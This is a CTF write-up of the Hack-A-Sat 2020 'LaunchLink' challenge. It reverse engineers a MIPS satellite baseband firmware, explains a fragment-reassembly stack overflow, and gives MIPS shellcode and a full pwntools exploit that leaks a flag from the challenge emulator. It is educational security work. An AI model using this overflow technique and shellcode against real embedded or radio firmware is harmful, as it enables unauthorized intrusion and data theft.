@@ -1,0 +1,997 @@
+---
+title: "Hack-A-Sat Quals 2020 LaunchLink Writeup"
+tags: ['re', 'pwn', 'ctf']
+date: 2020-07-10
+---
+
+## Table of contents
+
+<TOCInline toc={props.toc} exclude="Overview" toHeading={2} />
+
+<div>
+![img](/static/images/hackasat2020launchlink/chall.png)
+</div>
+
+From `notes.txt` that comes with the challenge files:
+```
+Our team managed to download off an open FTP server from LaunchDotCom's website
+and found some interesting documents about their upcoming Satellte Internet
+service. We've figured out how to communicate over the RF link but we need your
+help to figure out how to exploit the baseband processor on the satellite.
+
+We've managed to download the firmware for the baseband processor of the
+payload module from the open FTP server.
+
+It appears they graciously left an emulator on their public FTP server for
+debugging their platform, we have provided that as well. Our team has
+determined that the target system uses 2MB of RAM and to run the emulator use
+the following command line:
+
+vmips -o memsize=2097152 firmware.bin
+
+Our team would like to access sensitive data located 0xa2008000 on the running system.
+
+Good Luck!
+```
+
+The challenge is a [baseband processor](https://en.wikipedia.org/wiki/Baseband_processor) firmware built on MIPS architecture. We
+are given an emulator to go with it to run it on an x86 system. The emulator
+is modified to map a flag device on memory that is meant to be read by
+exploiting the firmware.
+
+First off, the emulator is supposed to have a 
+gdb stub for remote debugging, but it does not work. I'm not sure if this
+ is intentional but many people reported this issue and there were no updates
+ to the challenge, so I'm gonna have to assume that it was intentional. I've
+tried running it with a public vmips build, but it crashed. At this point I 
+had some options:
+
+- Get the firmware to work with a public vmips build and use debugger.
+- Instrument the modified vmips build and build my own debugger on top of the
+  emulator.
+- Modify the firmware, overwrite instructions with break and load vmips'
+  register and memory dumps into r2 and statically analyze states.
+
+Because I'm a lazy bum, I opted for the last option. Needless to say that in
+the long run this was a very tiring process, but I kept at it. Since I haven't
+tried the other approaches, I'm blissfully happy with my ignorance.
+
+You can find [my project files here](/hackasat2020launchlink/launchlink_rev.zip).
+
+- [Reverse Engineering the Firmware](#reverse-engineering-the-firmware)
+  - [vmips](#vmips)
+  - [The Firmware](#the-firmware)
+  - [Debug Messages](#debug-messages)
+  - [Static Analysis](#static-analysis)
+  - [Calling Convention and Decompilation](#calling-convention-and-decompilation)
+- [High-Level Logic](#high-level-logic)
+  - [Queues](#queues)
+  - [MAC Layer](#mac-layer)
+  - [RLL Layer](#rll-layer)
+    - [Dedicated Messages](#dedicated-messages)
+  - [RRL layer](#rrl-layer)
+    - [Encryption](#encryption)
+- [The Vulnerability](#the-vulnerability)
+  - [Fragment Reassembly](#fragment-reassembly)
+  - [Exploitation](#exploitation)
+    - [The Shellcode](#the-shellcode)
+    - [The Final Exploit](#the-final-exploit)
+- [References](#references)
+
+# Reverse Engineering the Firmware
+
+## vmips
+
+vmips is an open-source MIPS emulator project. The modified version is crippled
+in debugger department, but the rest of the functionality is still intact.
+Register and memory dumps were essential in solving the challenge. Here are
+some useful options that I used during the process(The complete list can be
+found on the project's webpage<sup>[1](http://vmips.sourceforge.net/vmips/doc/vmips.html)</sup>
+):
+
+- haltdumpcpu: This option enables dumping registers whenever the emulation is
+  terminated. Also applies to break instructions. I used this option
+  extensively when I was analyzing states.
+- memdump: Enables memory dumping whenever the emulation is terminated.
+- instdump: Instruction trace. This option was not too useful except at the
+  beginning where I didn't know if the firmware was actually running or not
+  :). Since the firmware was running realtime, the instruction trace could
+  easily stack up to hundreds of megabytes, so it wasn't really practical in a
+  way that was useful for me.
+
+<div>
+![img](/static/images/hackasat2020launchlink/vmips.png)
+</div>
+
+## The Firmware
+
+The firmware handles connections through UART interface. The most important
+thing about it is that it actually comes with debug messages, which are
+triggered constantly but never seen on the output. Even so, they were extremely
+useful in identifying structures and procedures in static analysis.
+
+## Debug Messages
+
+As I've confirmed with instruction trace, there is actually a constant stream
+of debug messages to the output. However, the debug printf function
+(`0xbfc017e0`) checks verbosity level (`0xa0180050`) and since the value is zero,
+nothing makes its way to the output. I nop'ed the check to get debug output.
+After this point it was a lot easier to see what the firmware was doing with my
+inputs.
+
+<div>
+![img](/static/images/hackasat2020launchlink/debug.png)
+</div>
+
+I also used the string references in the static disassembly to understand the
+functions of different branches. I've spent most of my time on this approach.
+
+## Static Analysis
+
+For disassembly and static analysis I used r2 with r2ghidra plugin. They both
+worked great to a certain extent. There were a couple crashes that set me back
+a little bit, but its all good in the end. I loaded the firmware with the
+following parameters:
+
+```
+$ r2 -a mips -m 0xbfc00000 -b 32 challenge.rom
+```
+
+ROM itself is kinda useless without the RAM because the firmware copies itself
+onto RAM in the initialization stage<sup>[2](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf)</sup>
+and the referenced strings are the ones
+on RAM. Thus I also need to map the RAM. That's where the memdump.bin
+generated by vmips comes in handy. A memdump of any state in the execution
+should be enough(Just hit CTRL+\ while vmips is running the firmware with '-o
+memdump' option.). I mapped memdump.bin using the following command in r2
+shell:
+
+```
+[0xbfc00000]> on ./memdump.bin 0xa0000000
+```
+
+Firmware's entry point is 0xbfc00000, so this is where I started the analysis.
+I went with the usual, totally not over-the-top analysis r2:
+
+```
+[0xbfc00000]> aaaaaa
+```
+
+R2 identified pretty much every function within the firmware. This was a great
+starting point. Using the vmips documents<sup>[2](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf)</sup>
+, I found the main function
+(`0xbfc08de0`) and started reversing.
+
+## Calling Convention and Decompilation
+
+Function arguments are passed through a0-a3 registers<sup>[3](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch05s03.html)</sup> and the stack. The
+return register is v0. In the firmware, functions rarely use the stack so the
+arguments are fairly easy to track. With correct argument types and struct
+definitions, the decompiler output can transform from this:
+
+```
+:> pdg
+
+undefined4 fcn.bfc01aac(int32_t param_1)
+{
+    undefined4 uVar1;
+    
+    if (*(int32_t *)(param_1 + 0x10) != 0) {
+        uVar1 = fcn.bfc0802c();
+        *(int32_t *)(param_1 + 0x10) = *(int32_t *)(param_1 + 0x10) + -1;
+        return uVar1;
+    }
+    return 0;
+}
+```
+
+to this:
+
+```
+:> to defs.h
+:> afvr a0 queue queue_struct*
+:> pdg
+
+undefined4 fcn.bfc01aac(queue_struct *queue)
+{
+    undefined4 uVar1;
+
+    if (queue->entry_count != 0) {
+        uVar1 = fcn.bfc0802c();
+        queue->entry_count = queue->entry_count - 1;
+        return uVar1;
+    }
+    return 0;
+}
+```
+
+It's not without its problems though, at the time of writing this, r2ghidra
+would crash whenever I used recursive data structures, so I had to use integer
+types for linked list pointers like prev and next.
+
+# High-Level Logic
+
+The firmware is a custom radio network stack implementation. After initializing
+the structures of each layer, it goes into an infinite loop, iterating through
+each layer's queue and processing packets.
+
+The network stack consists of three layers:
+
+- MAC (?) @`0xbfc085ec`
+- RLL (Radio Link Layer) @`0xbfc015e0`
+- RRL (Radio Resource Layer) @`0xbfc02b9c`
+
+Most of the logic that is relevant to the exploitation is given by the following 
+diagram:
+
+```
++------------------------------------------------------------------------------+
+|                                                                              |
+|                                                                              |
+|                +----------------------+                                      |
+|                |                      |                                      |
+|      +-------->+  AP setup and other  +------------------+                   |
+|      |         |  operations          |                  |                   |
+|      |         |                      |                  |                   |
+|      |         +----------------------+                  |                   |
+|      |                                                   |                   |
+|      |                                                   |                   |
+|      |                   +---------------+               |                   |
+|      +--+Type 0x17+----->+  Initialize   +--------+      |                   |
+|      |                   |  Encryption   |        |      |                   |
+|      |                   +---------------+        |      |                   |
+|      |                                            |      |                   |
+|    +-+---------------------+                      |      |                   |
+|    |  Decode queue packet  |                      |      |                   |
+|    +---------+-------------+                      |      |                   |
+|              ^                                    |      |                   |
+|              |                                    |      |                   |
+|Radio         |                                    v      v                   |
+|Resource   +--+--------------------+           +---+------+------------+      |
+|Layer      |                       |           |                       |      |
++-----------+     RLLRRL QUEUE      +-----------+     RRLRLL QUEUE      +------+
+|           |                       |           |                       |      |
+|           +--+--------------------+           +-----------+-----------+      |
+|              ^                                            |                  |
+|              |                                            v                  |
+|     +--------+---------+                         +--------+---------+        |
+|     |  Enqueue packet  |                         |  Dequeue packet  |        |
+|     +-+-------+-----+--+                         +--+---------------+        |
+|       ^       ^     ^                               |                        |
+|       |       |     |                               v                        |
+|       |       |   +-+--------------+         +------+----------------+       |
+|       |       |   |  Handle        |         |  Decode queue packet  |       |
+|       |       |   |  Dedicated     |         +-+---------------------+       |
+|       |       |   |  Message       |           |                             |
+|       |       |   +----+-----------+           |                             |
+|       |       |        ^                       +---+Type 0xd2+----+          |
+|       |       |        |                       |                  |          |
+|       |       |        |                       |                  v          |
+|       |  +----+--------+----+                  |  +---------------+-------+  |
+|       |  |  Decrypt packet  |                  |  | Initialize encryption |  |
+|       |  +----+--------+----+                  |  |    keys and enable    |  |
+|       |       ^        ^                       |  |      encryption       |  |
+|       |       |        |                       |  +-----------------------+  |
+|       |       |        |                       |                  |          |
+|       |       |        +---+Type 0x73+----+    +------------+     |          |
+|       |       |         Dedicated Message |                 |     |          |
+|       |       |                           |                 v     |          |
+|       |       |                           |      +----------+-----------+    |
+|       |       +------------+Type 0xc3+----+      |  Handle dedicated,   |    |
+|       |                    Fast message   |      |   fast and plain     |    |
+|       |                                   |      |      messages        |    |
+|       |                                   |      +--+-------------------+    |
+|       +--------------------+Type 0x17+----+         |             |          |
+|                                           |         |             |          |
+|                                           |         |             |          |
+|                       +-------------------+--+      |             |          |
+|      +--+Type 0x37+-->+  Decode data chunk   |      |             |          |
+|      |                +----------------------+      |             |          |
+|      |                                              |             |          |
+|      |                +-----------------+           |             |          |
+|      +--+Type 0x31+-->+  Init PDU pool  |           |             |          |
+|      |                +-----------------+           |             |          |
+|      |                                              |             |          |
+|      |                +-----------------+           |             |          |
+|      +--+Type 0x4a+-->+  Update time    |           |             |          |
+|      |                +-----------------+           |             |          |
+|      |                                              |             |          |
+|    +-+---------------------+                        |             |          |
+|    |  Decode queue packet  |                        |             |          |
+|    +-------+---------------+                        |             |          |
+|            ^                                        |             |          |
+|            |                                        |             |          |
+|Radio       |                                        v             v          |
+|Link     +--+---------------------+         +--------+-------------+-+        |
+|Layer    |                        |         |                        |        |
++---------+      MACRLL QUEUE      +---------+      RLLMAC QUEUE      +--------+
+|         |                        |         |                        |        |
+|         +----------+-------------+         +----------------+-------+        |
+|                    ^                                        |                |
+|                    |                                        |                |
+|                    |                                        |                |
+|           +--------+-------+                                |                |
+|           | Enqueue packet +<----------+------+-------+     |                |
+|           +----------------+           |      |       |     |                |
+|                                        |      |       |     |                |
+|                                        |      |       |     |                |
+|                   +-----------+        |      |       |     |                |
+|    +-+Type 0xe3+->+           +--------+      |       |     |                |
+|    |              |   Check   |               |       |     |                |
+|    |              |    CRC    |  +------------+----+  |     |                |
+|    +-+Type 0x79+->+           +->+ Update PDU size |  |     |                |
+|    |              +-----------+  +-----------------+  |     |                |
+|    |                                                  |     |                |
+|    |                    +-----------------+           |     |                |
+|    +-+Type 0x13+------->+ Reset PDU Size  +-----------+     |                |
+|    |                    +-----------------+                 |                |
+|  +-+---------+                                              |                |
+|  | Assemble  |                                              |                |
+|  | PDU       |                                              |                |
+|  +-----+-----+                                              |                |
+|        ^                                                    |                |
+|Mac     |                                                    |                |
+|Layer   |                                                    v                |
++--------+----------------------------------------------------+----------------+
+|      input                                                output             |
+|                            UART interface                                    |
+|                                                                              |
++------------------------------------------------------------------------------+
+```
+
+## Queues
+
+Each consecutive layer has two one-way queue to the next to exchange packets.
+These queues have simple structures:
+
+```c
+struct queue_struct {
+    uint32_t queue_size;
+    struct queue_node *head;
+    struct queue_node *tail;
+    char *queue_name;
+    uint32_t unk1;
+};
+```
+
+Each node points to a data chunk:
+
+```c
+struct queue_node {
+    uint32_t next;
+    uint32_t prev;
+    uint32_t curr_queue;
+    struct queue_packet *packet;
+    uint32_t packet_size;
+    void *destructor_fcn;
+};
+```
+
+And each data chunk has a type, a timestamp and the data itself:
+
+```c
+struct queue_packet {
+    uint8_t  type;
+    uint32_t timestamp;
+    char     data[PDU_SIZE-3];
+};
+```
+
+Keep in mind that queue packets have types just like network packets. Unlike
+network packets, these types are assigned internally.
+
+## MAC Layer
+
+MAC layer is the first layer of the network stack. It reads the input from UART
+interface and reassembles PDUs, then processes these PDUs according to their
+types.
+
+```c
+struct mac_struct {
+    uint32_t max_pdu_size;                      // 0x0
+    uint32_t min_pdu_size;                      // 0x4
+    uint32_t default_pdu_size;                  // 0x8
+    uint32_t MAC_PDU_DATA_BLOCK_TYPE;           // 0xc
+    uint32_t MAC_PDU_SET_DATA_BLOCK_SIZE_TYPE;  // 0x10
+    uint32_t MAC_PDU_RESET_TYPE;                // 0x14
+    uint32_t unk1;                              // 0x18
+    uint32_t unk2;                              // 0x1c
+    uint32_t init_time;                         // 0x20
+    uint32_t unk3;                              // 0x24
+    uint32_t curr_time;                         // 0x28
+    uint32_t send_time;                         // 0x2c
+    uint32_t uart_io;                           // 0x30
+    struct queue_struct *macrll_queue;          // 0x34
+    struct queue_struct *rllmac_queue;          // 0x38
+    struct queue_struct *global_queue;          // 0x3c, not used
+    char     pdu_buffer[0x180];                 // 0x40
+    uint16_t curr_pdu_buffer_size;              // 0x1c0
+    uint8_t  curr_pdu_size;                     // 0x1c2
+    uint8_t  padding;                           // 0x1c3
+    uint32_t received_packet_count;             // 0x1c4, max 20
+    uint32_t uninitialized_flag;                // 0x1c8
+};
+```
+
+
+There are three input PDU types that are handled by MAC layer:
+
+```
+  Type                                                                pdu length
+0      1         3                                                 (default 0x20)
++------+---------+-------------------------------------------------------------+
+| 0x13 |  crc16  |                         discarded                           |
++------+---------+-------------------------------------------------------------+
+```
+
+Type 0x13 resets the pdu size and sends a message to RLL layer to reset the PDU
+pool. This essentially resets the connection.
+
+```
+0      1         3              4
++------+---------+--------------+----------------------------------------------+
+| 0x79 |  crc16  |  new length  |                discarded                     |
++------+---------+--------------+----------------------------------------------+
+```
+
+Type 0x79 packets set a new PDU size. This size is limited by a min and a max
+value. Minimum and maximum values are 0x10 and 0xc0, respectively. Size is also
+required to be a multiple of 4.
+
+```
+0      1         3
++------+---------+-------------------------------------------------------------+
+| 0xe3 |  crc16  |                       rll data block                        |
++------+---------+-------------------------------------------------------------+
+```
+
+Type 0xe3 packets hold new data blocks to be processed by the RLL layer.
+
+MAC layer also checks the RLLMAC queue and sends any waiting packet to the
+UART output.
+
+The crc16 variant in use is X-25 (`0xbfc083b0`).
+
+## RLL Layer
+
+RLL is the layer responsible for the encryption and reassembling big messages
+that arrive in parts(dedicated messages). By default, encryption is not enabled
+and without encryption, dedicated and fast messages are discarded.
+
+```c
+struct rll_struct {
+    void *pdu_pool;                     // 0x00
+    uint32_t last_item;                 // 0x04
+    uint32_t pool_item_count;           // 0x08
+    uint32_t dedicated_pool_item_count; // 0x0c, ??
+    struct dedicated_queue_struct dedicated_queue;
+    uint32_t unk7;                      // 0x1c
+    uint32_t current_time;              // 0x20
+    uint32_t unk8;                      // 0x24
+    uint32_t last_packet_time;          // 0x28
+    uint32_t time_passed;               // 0x2c
+    uint8_t pdu_size;                   // 0x30
+    uint8_t encryption_enabled;         // 0x31
+    uint8_t unk11;                      // 0x32
+    uint8_t unk12;                      // 0x33
+    uint8_t some_key[16];               // 0x34
+    uint32_t unk17;                     // 0x44
+    uint8_t decryption_key[8];          // 0x48
+    uint8_t encryption_key[8];          // 0x4c
+    uint32_t sequence_number;           // 0x58
+    uint32_t unk23;                     // 0x5c
+    uint32_t received_packet_count;     // 0x60, max 0xf0
+    struct queue_struct *macrll_queue;  // 0x64
+    struct queue_struct *rllrrl_queue;  // 0x68
+    struct queue_struct *rllmac_queue;  // 0x6c
+    struct queue_struct *rrlrll_queue;  // 0x70
+    struct queue_struct *global_queue;  // 0x74, not really used
+};
+```
+
+RLL layer processes three types of queue packets from MACRLL queue (0xbfc01454):
+
+- 0x4a: Update the timestamp.
+- 0x31: Initialize the PDU pool that keeps incoming data blocks.
+- 0x37: New data block.
+
+RLL data blocks extracted from 0x37 type packets have three types:
+
+```
+  Type
+0      1      2                                        0x62       pdu length - 3
++------+------+-----------------------------------------+----------------------+
+| 0x17 | 0x70 |       encryption primitive              |      discarded       |
++------+------+-----------------------------------------+----------------------+
+```
+
+Type 0x17 packets initialize and enable encryption.
+
+```
+  Type                                                            pdu length - 3
+0      1                                                           (default 0x1d)
++------+-----------------------------------------------------------------------+
+| 0xc3 |                             data                                      |
++------------------------------------------------------------------------------+
+       ^-------------------------+ENCRYPTED+-----------------------------------^
+```
+
+Type 0xc3 packets carry fast messages. These messages are contained within one
+packet and are enqueued in RLLRRL queue immediately after decryption.
+
+```
+  Type                                                            pdu length - 3
+0      1               3                                           (default 0x1d)
++------------------------------------------------------------------------------+
+| 0x73 |  sequence no  |                   data fragment                       |
++------------------------------------------------------------------------------+
+       ^-------------------------+ENCRYPTED+-----------------------------------^
+```
+
+Type 0x73 packets carry fragments of dedicated messages. These fragments are
+kept in the pdu pool until a packet arrives with end flag.
+
+### Dedicated Messages
+
+Dedicated messages arrive in fragments, and these fragmented messages have
+sequence numbers. These numbers are actually three values packed in 16 bits:
+
+```
+0           1                                       12                        16
++-----------+----------------------------------------+-------------------------+
+|  end bit  |            sequence window             |       fragment no       |
++-----------+----------------------------------------+-------------------------+
+```
+
+- end bit: Marks the end of fragments. When a packet with end bit arrives, all
+  fragments of the same sequence window will be reassembled (`0xbfc04414`).
+
+- sequence window: Each dedicated message has a sequence window that allows up
+  to 16 fragments.
+
+- fragment no: Order of the fragment in the sequence window.
+
+## RRL layer
+
+This layer deals with setting up APs and encryption. I haven't gone deep into
+it, except for the encryption initialization procedure(which I failed to
+understand how it works). Because the vulnerability is in the RLL layer, the
+exploit interacts with RRL layer only briefly.
+
+### Encryption
+
+The packets are encrypted (`0xbfc00a30`) and decrypted (`0xbfc00ac0`) with simple
+xor, however there are key initialization and key update mechanisms. The xor
+keys are updated every 8 bytes. Honestly I couldn't make much sense of what's
+going on in initialization and update mechanisms, so I took a shortcut. There
+is no randomness and the key initialization ends up with the same xor keys when
+I send the same packet, so I just reimplemented the key update function and
+snatched the initial keys from a memdump.
+
+```c
+uint32_t decrypt_block(rll_struct *rll_struct, char *data, uint32_t len)
+{
+    uint8_t *puVar1;
+    uint32_t uVar2;
+    uint8_t *puVar3;
+    uint8_t *puVar4;
+    uint8_t *puVar5;
+    uint32_t uVar6;
+
+    uVar6 = (uint32_t)rll_struct->encryption_enabled;
+    if (uVar6 != 0) {
+        puVar3 = (uint8_t *)(data + len);
+        puVar4 = rll_struct->decryption_key;
+        puVar5 = rll_struct->some_key;
+        puVar1 = (uint8_t *)data;
+        while (puVar3 != puVar1) {
+            uVar2 = (uint32_t)(puVar1 + -(int32_t)data) & 7;
+            if (uVar2 == 0) {
+                update_key(rll_struct, puVar4, puVar5);
+            }
+            *puVar1 = puVar4[uVar2] ^ *puVar1;
+            puVar1 = puVar1 + 1;
+        }
+        return uVar6;
+    }
+    return 0;
+}
+```
+
+# The Vulnerability
+
+I've talked about the inner workings that are relevant to the exploit. Now it's
+time to talk about the vulnerable part of this application.
+
+## Fragment Reassembly
+
+Normally, when a packet with end bit arrives, the function that reassembles the
+fragments (`0xbfc04414`) first checks if the total length of the fragments are
+smaller than the maximum size allowed(which is 0x500=1280)(`0xbfc043c0`).
+
+```c
+undefined4 reassemble_packets(dedicated_queue_node *dedicated_msg, char *begin,
+                              uint32_t size, char *end)
+{
+    uint32_t uVar1;
+    undefined4 uVar2;
+    undefined4 *puVar3;
+    uint32_t *puVar4;
+    int32_t iVar5;
+    
+    uVar1 = calculate_total_size(dedicated_msg);
+    uVar2 = 0;
+    if (uVar1 <= size) {
+        puVar4 = dedicated_msg->fragment_pool;
+        iVar5 = 0;
+        do {
+            puVar3 = (undefined4 *)*puVar4;
+            if (puVar3 != (undefined4 *)0x0) {
+                memcpy(begin + iVar5, *puVar3, *(undefined *)(puVar3 + 1));
+                iVar5 = iVar5 + (uint32_t)*(uint8_t *)(*puVar4 + 4);
+            }
+            puVar4 = puVar4 + 1;
+            uVar2 = 1;
+        } while (puVar4 != (uint32_t *)&dedicated_msg->sequence_window);
+        *(int16_t *)end = (int16_t)iVar5;
+    }
+    return uVar2;
+}
+
+int16_t calculate_total_size(dedicated_queue_node *dedicated_msg)
+{
+    int16_t iVar1;
+    uint32_t uVar2;
+    int32_t iVar3;
+    
+    iVar1 = 0;
+    uVar2 = 0;
+    iVar3 = 4;
+    do {
+        if ((&dedicated_msg->next)[iVar3] != 0) {
+            iVar1 = iVar1 + (uint16_t)*(uint8_t *)((&dedicated_msg->next)[iVar3] + 4);
+        }
+        uVar2 = uVar2 + 1 & 0xff;
+        iVar3 = uVar2 + 4;
+    } while (uVar2 <= dedicated_msg->end_fragment_no);
+    return iVar1;
+}
+```
+
+The critical fault here is that the check only sums the fragments up to the one
+with end flag enabled. However, it is possible to send fragments with bigger
+fragment numbers before sending the terminating fragment. The fragments with
+higher fragment numbers than the terminating fragment will not be added to the
+total length, allowing me to reassemble a dedicated message bigger than
+the available buffer(maximum message size * 16 > 1280, even 7 fragments will
+overflow the buffer). Even better, the reassembly function uses the *stack* to
+reassemble the fragments, so the message will overflow into the stack.
+
+## Exploitation
+
+It's time to implement everything above to exploit the vulnerability. Here's
+how the exploit will interact with the firmware:
+
+- set the current PDU size to maximum (0xc0)
+- initialize and enable encryption
+- send the fragments 0-3, with nop sleds as data (not actually used, but just in case)
+- send the fragments 5-9, with shellcode address as data
+- send the fragment 4 with end flag, with shellcode as data
+- read the flag
+- profit
+
+I opened a memdump after overflowing the stack and got the necessary offsets.
+The message will look like this after its reassembly:
+
+```
++--------------+-->Beginning of the dedicated
+|  0x00000000  |   message buffer
+|  0x00000000  |
+|  0x00000000  |
+|              |
+|     NOP      |
+|     sled     |
+|              |
+|  0x00000000  |
+|  0x00000000  |
+|      .       |
+|      .       |
+|      .       |
++----------------->0xa00fea7c
+|              |
+|              |
+|              |
+|  shellcode   |
+|              |
+|              |
+|              |
++--------------+
+|  0xa00fea7c  |
+|  0xa00fea7c  |
+|  0xa00fea7c  |
+|  0xa00fea7c  +-->End of the dedicated
+|  0xa00fea7c  |  |message buffer
+|  0xa00fea7c  |  |
+|  0xa00fea7c  |  |
+|              |  |
+|   repeated   |  |
+|   shellcode  |  +
+|    address   | Stack space used by
+|              | other functions
+|  0xa00fea7c  |  +
+|  0xa00fea7c  |  |
+|  0xa00fea7c  |  |
+|      .       |  |
+|      .       |  |
+|      .       |  |
++--------------+-->
+```
+
+Fortunately, the return address is picked up and the program executes the
+shellcode without any additional manipulation.
+
+### The Shellcode
+
+Since there is already a write function at my disposal (`0xbfc08cbc`), I only need to set the arguments straight
+and branch right into it. One little problem I experienced: The write function
+wasn't able to give me the flag at once. That's why I modified the shellcode to
+call write with length=1 and iterate over the flag.
+
+```
+/* this should only be executed once */
+move $s0, $zero
+
+/* load buffer address into a1 */
+lui $a1, 0xa200
+add $a1, $a1, 0x8000
+
+/* add current offset */
+add $a1, $a1, $s0
+add $s0, $s0, 1
+
+/* load uart io into a0 */
+lui $a0, 0xa00f
+add $a0, $a0, 0xecfc
+
+/* load buffer len into a2 */
+add $a2, $zero, 1
+
+/* load output function address into a3 */
+lui $a3, 0xbfc0
+add $a3, $a3, 0x8cbc
+
+/* set up the loop,
+   return address will be 
+   the second instruction */
+lui $ra, 0xa00f
+add $ra, $ra, 0xea80
+
+/* branch into output function */
+jr $a3
+nop
+```
+
+
+### The Final Exploit
+
+Here's the final exploit:
+
+```python
+from pwn import *
+from time import sleep
+import sys
+
+class Mac:
+    def __init__(self, io):
+        self.io = io
+        self.pdu_size = 0x20
+
+    @property
+    def data_size(self):
+        return self.pdu_size-3
+
+    def set_pdu_size(self, new_size):
+        assert(new_size >= 0x10 and new_size <= 0xc0)
+
+        payload = p8(new_size).ljust(self.data_size, b'\x00')
+        self.io.send(p8(0x79)
+                     + p16(crc.x_25(payload), endianness="big")
+                     + payload)
+        sleep(0.3)
+        self.pdu_size = new_size
+
+    def reset(self):
+        payload = b'\x00'*self.data_size
+
+        self.io.send(p8(0x13)
+                     + p16(crc.x_25(payload), endianness="big")
+                     + payload)
+        sleep(0.3)
+        self.pdu_size = 0x20
+
+    def send_pdu(self, data):
+        assert(len(data) == self.data_size)
+
+        self.io.send(p8(0xe3)
+                     + p16(crc.x_25(data), endianness="big")
+                     + data)
+        sleep(0.3)
+
+    def recv(self, length):
+        buf = b''
+        while len(buf) < length:
+            buf += io.recv(timeout=0.1)
+        return buf
+
+class Rll:
+    def __init__(self, mac: Mac):
+        self.mac = mac
+
+        self.sequence_no = 0
+
+        self.encryption_enabled = False
+        self.enc_key = b'\x58\x27\xba\xa3\xfb\xea\x0b\x02'
+        self.dec_key = b'\x04\xd1\x5b\x26\x8b\xab\x0d\xb9'
+
+    @property
+    def message_size(self):
+        return self.mac.data_size
+
+    def encrypt(self, data):
+        offset = 0
+        buf = ''
+        data = list(data)
+
+        while offset != len(data):
+            offset2 = offset & 7
+            if offset2 == 0:
+                self.enc_key = self.update_key(self.enc_key)
+            data[offset] ^= self.enc_key[offset2]
+            offset += 1
+
+        return bytes(data)
+
+    def update_key(self, key):
+        vector = [0x03f4d621, 0xccdd8da7, 0xaf0e3152, 0x4ae98888]
+        var3 = u32(key[:4])
+        var2 = u32(key[4:])
+        var1 = 0x3e778b90
+        while True:
+            var4 = var1 + vector[var1 & 3]
+            var4 &= 0xffffffff
+
+            var1 += 0x83e778b9
+            var1 &= 0xffffffff
+
+            var3 += var4 ^ (var2 << 4 ^ var2 >> 5) + var2
+            var3 &= 0xffffffff
+
+            var2 += (var1 + vector[var1 >> 11 & 3]) ^ ((var3 * 0x10 ^ var3 >> 5) + var3)
+            var2 &= 0xffffffff
+
+            if var1 == 0x7cef1720:
+                return p32(var3) + p32(var2)
+
+    def enable_encryption(self):
+        assert(self.message_size >= 0x60)
+
+        self.mac.send_pdu(p8(0x17)
+                          + p8(0x70)
+                          + b'\x00'*(self.message_size-2))
+        self.encryption_enabled = True
+
+    @property
+    def fragment_size(self):
+        return self.message_size-3
+
+    def send_fragment(self, fragment_data, fragment_no, sequence_window=0, end=0):
+        assert(len(fragment_data) == self.fragment_size)
+        assert(sequence_window < 0x800)
+        assert(fragment_no < 0x10)
+        assert(end <= 1)
+
+        fragment = (p16(end<<15 | sequence_window<<4 | fragment_no)
+                    + fragment_data)
+        payload = self.encrypt(fragment)
+        self.mac.send_pdu(p8(0x73)
+                          + payload)
+
+context.arch = 'mips'
+context.bits = 32
+
+shellcode = asm('''
+move $s0, $zero
+
+/* load buffer address into a1 */
+lui $a1, 0xa200
+add $a1, $a1, 0x8000
+
+/* add current offset */
+add $a1, $a1, $s0
+add $s0, $s0, 1
+
+/* load uart io into a0 */
+lui $a0, 0xa00f
+add $a0, $a0, 0xecfc
+
+/* load buffer len into a2 */
+add $a2, $zero, 1
+
+/* load output function address into a3 */
+lui $a3, 0xbfc0
+add $a3, $a3, 0x8cbc
+
+/* set up the loop */
+lui $ra, 0xa00f
+add $ra, $ra, 0xea80
+
+/* branch into output function */
+jr $a3
+nop
+''')
+
+ticket='your_ticket'
+
+if __name__ == '__main__':
+    if "remote" in sys.argv:
+        #io = remote('launchlink.satellitesabove.me', 5065)
+        io = remote('52.14.23.173', 5065)
+        io.recv()
+        io.sendline(ticket)
+    else:
+        io = process(["./vmips",
+                     "-o", "memsize=2097152",
+                     #"-o", "haltdumpcpu",
+                     #"-o", "memdump",
+                     #"-o", "nohaltbreak",
+                     #"-o", "instdump",
+                     "challenge.rom"],
+                     #stdout=open('vmips_output.txt', 'wb')
+                    )
+        io.recv()
+        sleep(0.3)
+
+    mac = Mac(io)
+    rll = Rll(mac)
+
+    mac.set_pdu_size(0xc0)
+    print(f'[*] Set pdu size to 0xc0.')
+
+    rll.enable_encryption()
+    mac.recv(0x60)
+    print(f'[*] Enabled encryption.')
+
+    for i in range(0, 4):
+        rll.send_fragment(b'\x00'*rll.fragment_size, fragment_no=i)
+    print(f'[*] Sent fragments [0-3] (nop sled)')
+
+    shellcode_addr = 0xa00fea7c
+    break_addr = 0xa00ffed8
+    for i in range(5, 10):
+        # two bytes added for alignment
+        rll.send_fragment(b'\x00\x00' + p32(shellcode_addr)*((rll.fragment_size-2)>>2),
+                          fragment_no=i)
+    print(f'[*] Sent fragments [5-9] (shellcode address)')
+
+    for i in range(4, 5):
+        rll.send_fragment(shellcode.ljust(rll.fragment_size), fragment_no=i, end=1)
+    print(f'[*] Sent fragment [4] (shellcode)')
+
+    flag = mac.recv(110).rstrip(b'\x00')
+    print(f'[*] Flag: {flag}')
+```
+<div>
+![img](/static/images/hackasat2020launchlink/flag.png)
+</div>
+
+# References
+
+[1] [http://vmips.sourceforge.net/vmips/doc/vmips.html](http://vmips.sourceforge.net/vmips/doc/vmips.html)
+
+[2] [http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.534.3259&rep=rep1&type=pdf)
+
+[3] [http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch05s03.html](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch05s03.html)
+
+[https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf](https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf)
+
+[https://crccalc.com/](https://crccalc.com/)
